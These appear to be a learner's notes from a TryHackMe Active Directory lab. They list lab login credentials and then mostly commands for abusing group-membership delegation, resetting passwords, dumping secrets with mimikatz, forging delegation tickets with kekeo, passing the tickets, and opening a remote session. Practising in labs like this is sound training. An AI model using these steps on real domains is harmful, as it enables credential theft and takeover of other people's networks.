christine.hall 

Randall1973

ssh za.tryhackme.loc\\christine.hall@thmwrk1.za.tryhackme.loc
ssh za.tryhackme.loc\\t2_melanie.davies@thmwrk1.za.tryhackme.loc

# Permission Delegation
***
# AddMember
```Powershell
Add-ADGroupMember "<Group>" -Members "<AD Username>"

# Verify it worked with
Get-ADGroupMember -Identity "<Group>"
```

# List accounts of an AD group
```Powershell
# List all groups
Get-ADGroup -Filter {Name -like "pattern"}

# List members of group
Get-ADGroupMember -Identity "Tier 2 Admins"

# Reset password of a member
Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password
```
***
# Kerberos Delegation
***
# Enumerate current available delegations
```
Import-Module C:\Tools\PowerView.ps1 
Get-NetUser -TrustedToAuth
```

# Dump secrets then generate tickets
```
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
mimikatz # token::elevate
mimikatz # lsadump::secrets
exit

# Generate tickets
C:\Tools\kekeo\x64\kekeo.exe
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

# Import into mimikatz
mimikatz # kerberos::ptt  TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

# Start new ps-session, then enter the session
```
PS C:> New-PSSession -ComputerName thmserver1.za.tryhackme.loc
PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

